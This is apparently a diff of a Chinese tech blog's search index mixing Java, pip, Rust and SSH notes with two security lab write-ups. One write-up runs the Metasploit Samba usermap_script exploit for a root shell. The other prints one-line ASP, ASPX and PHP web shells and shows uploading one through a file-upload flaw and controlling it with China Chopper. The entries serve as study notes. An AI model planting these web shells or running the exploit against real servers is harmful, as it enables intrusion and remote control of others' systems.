+<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类型不同，个数不同，顺序不同</span></span><br><span class="line"><span class="comment">同一个类中</span></span><br><span class="line"><span class="comment">与返回值类型无关</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">        System.out.println(add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul>
+<li>一个java文件中可以定义多个class，但只能一个类是public，public的类名称必须和文件名相同，实际开发中建议一个文件定义一个类<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3></li>
+<li>对象代表什么，就得封装对应的数据，并提供数据对应的行为</li>
+</ul>
+<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">        FileOutputStream fop = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="comment">// 构建FileOutputStream对象,文件不存在会自动新建</span></span><br><span class="line">        OutputStreamWriter writer = <span class="keyword">new</span> OutputStreamWriter(fop, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 构建OutputStreamWriter对象,参数可以指定编码,默认为操作系统默认编码,windows上是gbk</span></span><br><span class="line">        writer.append(<span class="string">&quot;中文输入&quot;</span>);</span><br><span class="line">        <span class="comment">// 写入到缓冲区</span></span><br><span class="line">        writer.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 换行</span></span><br><span class="line">        writer.append(<span class="string">&quot;English&quot;</span>);</span><br><span class="line">        <span class="comment">// 刷新缓存冲,写入到文件,如果下面已经没有写入的内容了,直接close也会写入</span></span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="comment">// 关闭写入流,同时会把缓冲区内容写入文件,所以上面的注释掉</span></span><br><span class="line">        fop.close();</span><br><span class="line">        <span class="comment">// 关闭输出流,释放系统资源</span></span><br><span class="line">        FileInputStream fip = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">        <span class="comment">// 构建FileInputStream对象</span></span><br><span class="line">        InputStreamReader reader = <span class="keyword">new</span> InputStreamReader(fip, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 构建InputStreamReader对象,编码与写入相同</span></span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (reader.ready()) &#123;</span><br><span class="line">            sb.append((<span class="keyword">char</span>) reader.read());</span><br><span class="line">            <span class="comment">// 转成char加到StringBuffer对象中</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">        reader.close();</span><br><span class="line">        <span class="comment">// 关闭读取流</span></span><br><span class="line"></span><br><span class="line">        fip.close();</span><br><span class="line">        <span class="comment">// 关闭输入流,释放系统资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String dirname = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(dirname);</span><br><span class="line">        <span class="keyword">if</span> (f1.isDirectory()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;目录 &quot;</span> + dirname);</span><br><span class="line">            String s[] = f1.list();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">                File f = <span class="keyword">new</span> File(dirname + <span class="string">&quot;/&quot;</span> + s[i]);</span><br><span class="line">                <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">                    System.out.println(s[i] + <span class="string">&quot; 是一个目录&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(s[i] + <span class="string">&quot; 是一个文件&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(dirname + <span class="string">&quot; 不是一个目录&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.oxchang.ui;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameJFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">GameJFrame</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 设置大小</span></span><br><span class="line">		<span class="keyword">this</span>.setSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">		<span class="comment">// 设置标题</span></span><br><span class="line">		<span class="keyword">this</span>.setTitle(<span class="string">&quot;拼图游戏&quot;</span>);</span><br><span class="line">		<span class="comment">// 设置是否显示</span></span><br><span class="line">		<span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -634,6 +729,22 @@
       </tags>
   </entry>
   <entry>
+    <title>python永久换第三方库国内源</title>
+    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#北京外国语大学镜像站</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://mirrors.bfsu.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure>
+
+<p> 国内靠谱的 pip 镜像源有：</p>
+<p>(1)清华: <strong>pip config set global.index-url <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></strong></p>
+<p>(2)豆瓣: <strong>pip config set global.index-url <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></strong></p>
+<p>(3)阿里: <strong>pip config set global.index-url <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></strong></p>
+<p>(4)腾讯: <strong>pip config set global.index-url <a href="https://mirrors.cloud.tencent.com/pypi/simple/">https://mirrors.cloud.tencent.com/pypi/simple/</a></strong></p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>pip</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pyautogui的简单基础</title>
     <url>/2021/11/24/pyautogui%E7%9A%84%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="pyautogui的简单基础"><a href="#pyautogui的简单基础" class="headerlink" title="pyautogui的简单基础"></a>pyautogui的简单基础</h2><h3 id="安装pyautogui"><a href="#安装pyautogui" class="headerlink" title="安装pyautogui"></a>安装pyautogui</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyautogui</span><br></pre></td></tr></table></figure>
@@ -659,19 +770,39 @@
       </tags>
   </entry>
   <entry>
-    <title>python永久换第三方库国内源</title>
-    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#北京外国语大学镜像站</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://mirrors.bfsu.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure>
+    <title>rust修改默认环境变量与源</title>
+    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
+<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
+<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
 
-<p> 国内靠谱的 pip 镜像源有：</p>
-<p>(1)清华: <strong>pip config set global.index-url <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></strong></p>
-<p>(2)豆瓣: <strong>pip config set global.index-url <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></strong></p>
-<p>(3)阿里: <strong>pip config set global.index-url <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></strong></p>
-<p>(4)腾讯: <strong>pip config set global.index-url <a href="https://mirrors.cloud.tencent.com/pypi/simple/">https://mirrors.cloud.tencent.com/pypi/simple/</a></strong></p>
+<p>path 添加%CARGO_HOME%\bin</p>
+<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
-        <tag>python</tag>
-        <tag>pip</tag>
+        <tag>rust</tag>
+        <tag>环境变量</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>samba提权</title>
+    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
+<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
+<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
+<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
+<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
+<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
+<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
+<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>samba</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -831,42 +962,6 @@
         <tag>redrock</tag>
         <tag>ctf</tag>
         <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>samba提权</title>
-    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
-<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
-<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
-<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
-<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
-<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
-<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
-<p><img src="https://121.5.125.62:88/image/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>samba</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rust修改默认环境变量与源</title>
-    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
-<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
-<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
-
-<p>path 添加%CARGO_HOME%\bin</p>
-<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>rust</tag>
-        <tag>环境变量</tag>
       </tags>
   </entry>
   <entry>
@@ -1047,6 +1142,69 @@
       </tags>
   </entry>
   <entry>
+    <title>ssh文件权限问题</title>
+    <url>/2022/03/06/ssh%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="ssh文件权限问题"><a href="#ssh文件权限问题" class="headerlink" title="ssh文件权限问题"></a>ssh文件权限问题</h2><h3 id="0x00-权限过高"><a href="#0x00-权限过高" class="headerlink" title="0x00 权限过高"></a>0x00 权限过高</h3><p>今天使用mobaxterm生成的公钥的上传到服务器，准备登陆时反馈信息，server refused our key，主要原因是~/.ssh文件夹权限过高导致的问题，authorized_keys文件我给的权限是644，.ssh文件夹我给的权限是755，最后使用密钥登录成功。</p>
+]]></content>
+      <tags>
+        <tag>-ssh -权限 -远程ssh连接</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中国菜刀配合一句话木马基本使用</title>
+    <url>/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="中国菜刀配合一句话木马基本使用"><a href="#中国菜刀配合一句话木马基本使用" class="headerlink" title="中国菜刀配合一句话木马基本使用"></a>中国菜刀配合一句话木马基本使用</h2><p>目的：</p>
+<ul>
+<li>学习一句话木马</li>
+<li>学习菜刀的使用</li>
+</ul>
+<p>原理：<br>菜刀的主要功能是用来连接一句话木马的，asp、aspx、php的一句话菜刀都可以连，只是这几种一句话语句不一样。</p>
+<ul>
+<li><p>asp的一句话是：<code>&lt;%eval request(“pass”)%&gt;</code></p>
+</li>
+<li><p>aspx的一句话是：<code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],”unsafe”);%&gt;</code></p>
+</li>
+<li><p>php的一句话是：<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
+</li>
+</ul>
+<p>过程：</p>
+<ul>
+<li><p>打开火狐，<a href="http://192.168.1.3:8080/up%EF%BC%8C%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC![image-20211228105130236](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)">http://192.168.1.3:8080/up，打开文件上传漏洞演示脚本，点击中国菜刀连接一句话木马![image-20211228105130236](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)</a></p>
+</li>
+<li><p>点击浏览，上传php文件，木马地址为<a href="http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)">http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)</a></p>
+</li>
+<li><p>打开中国菜刀</p>
+</li>
+<li><p>添加木马地址，密码为lubr，脚本类型php(eval)<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105329855.png" alt="image-20211228105329855"></p>
+</li>
+<li><p>添加到主界面<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105353101.png" alt="image-20211228105353101"></p>
+</li>
+<li><p>右键文件管理，即可查看目标服务器的完整目录，也可进行创建文件，修改文件，修改和下载等相关操作<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105418680.png" alt="image-20211228105418680"></p>
+</li>
+<li><p>右键单击浏览网站，即可实现浏览器功能，浏览该站点<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105439630.png" alt="image-20211228105439630"></p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>木马</tag>
+        <tag>一句话</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu添加kali源</title>
+    <url>/2022/09/11/ubuntu%E6%B7%BB%E5%8A%A0kali%E6%BA%90/</url>
+    <content><![CDATA[<h3 id="原博客"><a href="#原博客" class="headerlink" title="原博客"></a>原博客</h3><p><a href="https://www.cnblogs.com/liyilong/p/13789586.html">https://www.cnblogs.com/liyilong/p/13789586.html</a></p>
+<h3 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置公钥"><a href="#设置公钥" class="headerlink" title="设置公钥"></a>设置公钥</h3><ol>
+<li><p>方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv ED444FF07D8D0BF6</span><br></pre></td></tr></table></figure></li>
+<li><p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:11371 --recv-keys ED444FF07D8D0BF6</span><br><span class="line">gpg --export --armor ED444FF07D8D0BF6 |apt-key add -</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>代码混淆</title>
     <url>/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</url>
     <content><![CDATA[<h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>目的：</p>
@@ -1162,46 +1320,6 @@
       </tags>
   </entry>
   <entry>
-    <title>中国菜刀配合一句话木马基本使用</title>
-    <url>/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="中国菜刀配合一句话木马基本使用"><a href="#中国菜刀配合一句话木马基本使用" class="headerlink" title="中国菜刀配合一句话木马基本使用"></a>中国菜刀配合一句话木马基本使用</h2><p>目的：</p>
-<ul>
-<li>学习一句话木马</li>
-<li>学习菜刀的使用</li>
-</ul>
-<p>原理：<br>菜刀的主要功能是用来连接一句话木马的，asp、aspx、php的一句话菜刀都可以连，只是这几种一句话语句不一样。</p>
-<ul>
-<li><p>asp的一句话是：<code>&lt;%eval request(“pass”)%&gt;</code></p>
-</li>
-<li><p>aspx的一句话是：<code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],”unsafe”);%&gt;</code></p>
-</li>
